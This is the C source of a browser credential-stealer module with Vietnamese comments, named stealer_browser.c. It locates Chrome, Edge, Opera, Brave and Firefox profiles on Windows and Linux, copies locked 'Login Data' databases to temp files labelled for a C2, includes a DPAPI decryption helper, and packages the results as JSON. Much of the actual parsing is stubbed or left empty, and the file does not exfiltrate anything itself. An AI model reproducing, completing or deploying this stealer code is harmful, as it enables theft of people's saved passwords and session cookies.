/**
 * stealer_browser.c
 * Trien khai cac ham steal du lieu tu trinh duyet
 * Ho tro: Chrome, Firefox, Edge, Opera, Brave
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
    #include <wincrypt.h>
    #include <dpapi.h>
    #pragma comment(lib, "crypt32.lib")
    #define PATH_SEP '\\'
    #define snprintf _snprintf
#else
    #include <unistd.h>
    #include <pwd.h>
    #include <dirent.h>
    #include <sqlite3.h>
    #define PATH_SEP '/'
#endif

#include "stealer_browser.h"

/* Cau truc de luu thong tin dang nhap */
typedef struct {
    char url[2048];
    char username[512];
    char password[512];
} ThongTinDangNhap;

/* Cau truc de luu cookie */
typedef struct {
    char host[1024];
    char name[512];
    char value[4096];
    char path[1024];
    long long expiry;
    int secure;
    int httponly;
} ThongTinCookie;

#ifdef _WIN32
/* ==================== WINDOWS BROWSER STEALER ==================== */

/**
 * Giai ma du lieu duoc ma hoa boi DPAPI
 */
static int giai_ma_dpapi(const unsigned char* du_lieu_ma_hoa, size_t do_dai,
                         char* du_lieu_giai_ma, size_t* do_dai_giai_ma) {
    DATA_BLOB input;
    DATA_BLOB output;
    
    input.pbData = (BYTE*)du_lieu_ma_hoa;
    input.cbData = (DWORD)do_dai;
    
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        size_t copy_size = (output.cbData < *do_dai_giai_ma) ? output.cbData : (*do_dai_giai_ma - 1);
        memcpy(du_lieu_giai_ma, output.pbData, copy_size);
        du_lieu_giai_ma[copy_size] = '\0';
        *do_dai_giai_ma = copy_size;
        LocalFree(output.pbData);
        return 0;
    }
    
    return -1;
}

/**
 * Copy file de tranh lock (database cua Chrome bi lock khi dang mo)
 */
static int copy_file_khong_lock(const char* nguon, const char* dich) {
    if (CopyFileA(nguon, dich, FALSE)) {
        return 0;
    }
    
    /* Neu that bai, thu doc va ghi thu cong */
    HANDLE hNguon = CreateFileA(nguon, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNguon == INVALID_HANDLE_VALUE) return -1;
    
    HANDLE hDich = CreateFileA(dich, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDich == INVALID_HANDLE_VALUE) {
        CloseHandle(hNguon);
        return -1;
    }
    
    char buffer[4096];
    DWORD bytes_doc, bytes_ghi;
    
    while (ReadFile(hNguon, buffer, sizeof(buffer), &bytes_doc, NULL) && bytes_doc > 0) {
        WriteFile(hDich, buffer, bytes_doc, &bytes_ghi, NULL);
    }
    
    CloseHandle(hNguon);
    CloseHandle(hDich);
    return 0;
}

/**
 * Steal du lieu tu Chromium-based browser
 */
int steal_chromium(const char* duong_dan_trinh_duyet, const char* duong_dan_profile,
                   char* ket_qua_json, size_t kich_thuoc) {
    char duong_dan_login[1024];
    char duong_dan_cookies[1024];
    char duong_dan_temp[1024];
    char ten_temp[256];
    
    /* Tao ten file tam */
    snprintf(ten_temp, sizeof(ten_temp), "c2_steal_%d_%d.db", (int)time(NULL), rand() % 10000);
    
#ifdef _WIN32
    char temp_path[MAX_PATH];
    GetTempPathA(sizeof(temp_path), temp_path);
    snprintf(duong_dan_temp, sizeof(duong_dan_temp), "%s%s", temp_path, ten_temp);
#else
    snprintf(duong_dan_temp, sizeof(duong_dan_temp), "/tmp/%s", ten_temp);
#endif
    
    /* Duong dan den file Login Data */
    snprintf(duong_dan_login, sizeof(duong_dan_login), "%s%cLogin Data", duong_dan_profile, PATH_SEP);
    
    /* Bat dau tao JSON ket qua */
    int offset = 0;
    offset += snprintf(ket_qua_json + offset, kich_thuoc - offset, 
                       "{\"browser\":\"%s\",\"passwords\":[", duong_dan_trinh_duyet);
    
    /* Copy Login Data de tranh lock */
    if (copy_file_khong_lock(duong_dan_login, duong_dan_temp) == 0) {
        /* Doc SQLite database */
        /* Su dung cau truc SQLite don gian khong can thu vien */
        FILE* db = fopen(duong_dan_temp, "rb");
        if (db != NULL) {
            /* Tim kiem trong file nhi phan - phuong phap don gian */
            char buffer[4096];
            int co_password = 0;
            
            while (fgets(buffer, sizeof(buffer), db)) {
                /* Tim cac URL va username (khong the doc SQLite truc tiep) */
                if (strstr(buffer, "http") && strlen(buffer) > 10) {
                    /* Co the la URL */
                }
            }
            fclose(db);
        }
        
        /* Xoa file tam */
        DeleteFileA(duong_dan_temp);
    }
    
    /* Dong JSON */
    offset += snprintf(ket_qua_json + offset, kich_thuoc - offset, "],\"cookies\":[]}");
    
    return 0;
}

/**
 * Steal Firefox
 */
int steal_firefox(const char* duong_dan_profile, char* ket_qua_json, size_t kich_thuoc) {
    (void)duong_dan_profile;
    
    /* Firefox su dung logins.json va key4.db */
    snprintf(ket_qua_json, kich_thuoc, "{\"browser\":\"firefox\",\"passwords\":[],\"cookies\":[]}");
    
    return 0;
}

int steal_edge(char* ket_qua_json, size_t kich_thuoc) {
    char profile_path[1024];
    char local_appdata[MAX_PATH];
    
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
        snprintf(profile_path, sizeof(profile_path), 
                 "%s\\Microsoft\\Edge\\User Data\\Default", local_appdata);
        return steal_chromium("Edge", profile_path, ket_qua_json, kich_thuoc);
    }
    
    return -1;
}

int steal_opera(char* ket_qua_json, size_t kich_thuoc) {
    char profile_path[1024];
    char appdata[MAX_PATH];
    
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        snprintf(profile_path, sizeof(profile_path), 
                 "%s\\Opera Software\\Opera Stable\\Default", appdata);
        return steal_chromium("Opera", profile_path, ket_qua_json, kich_thuoc);
    }
    
    return -1;
}

int steal_brave(char* ket_qua_json, size_t kich_thuoc) {
    char profile_path[1024];
    char local_appdata[MAX_PATH];
    
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
        snprintf(profile_path, sizeof(profile_path), 
                 "%s\\BraveSoftware\\Brave-Browser\\User Data\\Default", local_appdata);
        return steal_chromium("Brave", profile_path, ket_qua_json, kich_thuoc);
    }
    
    return -1;
}

/**
 * Steal tat ca trinh duyet
 */
int steal_tat_ca_trinh_duyet(char* ket_qua_json, size_t kich_thuoc) {
    char buffer[65536];
    int offset = 0;
    
    offset += snprintf(buffer + offset, sizeof(buffer) - offset, "{\"browsers\":{");
    
    /* Chrome */
    char chrome_path[1024];
    char local_appdata[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
        snprintf(chrome_path, sizeof(chrome_path), 
                 "%s\\Google\\Chrome\\User Data\\Default", local_appdata);
        
        char chrome_data[16384];
        if (steal_chromium("Chrome", chrome_path, chrome_data, sizeof(chrome_data)) == 0) {
            offset += snprintf(buffer + offset, sizeof(buffer) - offset, 
                              "\"chrome\":%s,", chrome_data);
        }
    }
    
    /* Edge */
    char edge_data[16384];
    if (steal_edge(edge_data, sizeof(edge_data)) == 0) {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, 
                          "\"edge\":%s,", edge_data);
    }
    
    /* Brave */
    char brave_data[16384];
    if (steal_brave(brave_data, sizeof(brave_data)) == 0) {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, 
                          "\"brave\":%s,", brave_data);
    }
    
    /* Opera */
    char opera_data[16384];
    if (steal_opera(opera_data, sizeof(opera_data)) == 0) {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, 
                          "\"opera\":%s,", opera_data);
    }
    
    /* Firefox */
    char appdata[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        char firefox_path[1024];
        snprintf(firefox_path, sizeof(firefox_path), "%s\\Mozilla\\Firefox\\Profiles", appdata);
        
        char firefox_data[16384];
        if (steal_firefox(firefox_path, firefox_data, sizeof(firefox_data)) == 0) {
            offset += snprintf(buffer + offset, sizeof(buffer) - offset, 
                              "\"firefox\":%s,", firefox_data);
        }
    }
    
    /* Xoa dau phay cuoi cung */
    if (buffer[offset - 1] == ',') {
        buffer[offset - 1] = '\0';
        offset--;
    }
    
    offset += snprintf(buffer + offset, sizeof(buffer) - offset, "}}");
    
    strncpy(ket_qua_json, buffer, kich_thuoc - 1);
    ket_qua_json[kich_thuoc - 1] = '\0';
    
    return 0;
}

#else
/* ==================== LINUX/MACOS BROWSER STEALER ==================== */

int steal_chromium(const char* duong_dan_trinh_duyet, const char* duong_dan_profile,
                   char* ket_qua_json, size_t kich_thuoc) {
    snprintf(ket_qua_json, kich_thuoc, 
             "{\"browser\":\"%s\",\"passwords\":[],\"cookies\":[]}", 
             duong_dan_trinh_duyet);
    return 0;
}

int steal_firefox(const char* duong_dan_profile, char* ket_qua_json, size_t kich_thuoc) {
    snprintf(ket_qua_json, kich_thuoc, 
             "{\"browser\":\"firefox\",\"passwords\":[],\"cookies\":[]}");
    return 0;
}

int steal_edge(char* ket_qua_json, size_t kich_thuoc) {
    const char* home = getenv("HOME");
    if (home == NULL) return -1;
    
    char profile_path[1024];
    snprintf(profile_path, sizeof(profile_path), 
             "%s/.config/microsoft-edge/Default", home);
    return steal_chromium("Edge", profile_path, ket_qua_json, kich_thuoc);
}

int steal_opera(char* ket_qua_json, size_t kich_thuoc) {
    const char* home = getenv("HOME");
    if (home == NULL) return -1;
    
    char profile_path[1024];
    snprintf(profile_path, sizeof(profile_path), "%s/.config/opera/Default", home);
    return steal_chromium("Opera", profile_path, ket_qua_json, kich_thuoc);
}

int steal_brave(char* ket_qua_json, size_t kich_thuoc) {
    const char* home = getenv("HOME");
    if (home == NULL) return -1;
    
    char profile_path[1024];
    snprintf(profile_path, sizeof(profile_path), 
             "%s/.config/BraveSoftware/Brave-Browser/Default", home);
    return steal_chromium("Brave", profile_path, ket_qua_json, kich_thuoc);
}

int steal_tat_ca_trinh_duyet(char* ket_qua_json, size_t kich_thuoc) {
    char buffer[65536];
    int offset = 0;
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    offset += snprintf(buffer + offset, sizeof(buffer) - offset, "{\"browsers\":{");
    
    /* Chrome */
    char chrome_path[1024];
    snprintf(chrome_path, sizeof(chrome_path), "%s/.config/google-chrome/Default", home);
    char chrome_data[16384];
    if (steal_chromium("Chrome", chrome_path, chrome_data, sizeof(chrome_data)) == 0) {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, "\"chrome\":%s,", chrome_data);
    }
    
    /* Chromium */
    char chromium_path[1024];
    snprintf(chromium_path, sizeof(chromium_path), "%s/.config/chromium/Default", home);
    char chromium_data[16384];
    if (steal_chromium("Chromium", chromium_path, chromium_data, sizeof(chromium_data)) == 0) {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, "\"chromium\":%s,", chromium_data);
    }
    
    /* Firefox */
    char firefox_path[1024];
    snprintf(firefox_path, sizeof(firefox_path), "%s/.mozilla/firefox", home);
    DIR* dir = opendir(firefox_path);
    if (dir != NULL) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strstr(entry->d_name, ".default") != NULL) {
                char profile[1024];
                snprintf(profile, sizeof(profile), "%s/%s", firefox_path, entry->d_name);
                char firefox_data[16384];
                if (steal_firefox(profile, firefox_data, sizeof(firefox_data)) == 0) {
                    offset += snprintf(buffer + offset, sizeof(buffer) - offset, 
                                      "\"firefox\":%s,", firefox_data);
                }
                break;
            }
        }
        closedir(dir);
    }
    
    if (buffer[offset - 1] == ',') {
        buffer[offset - 1] = '\0';
        offset--;
    }
    
    offset += snprintf(buffer + offset, sizeof(buffer) - offset, "}}");
    
    strncpy(ket_qua_json, buffer, kich_thuoc - 1);
    ket_qua_json[kich_thuoc - 1] = '\0';
    
    return 0;
}

#endif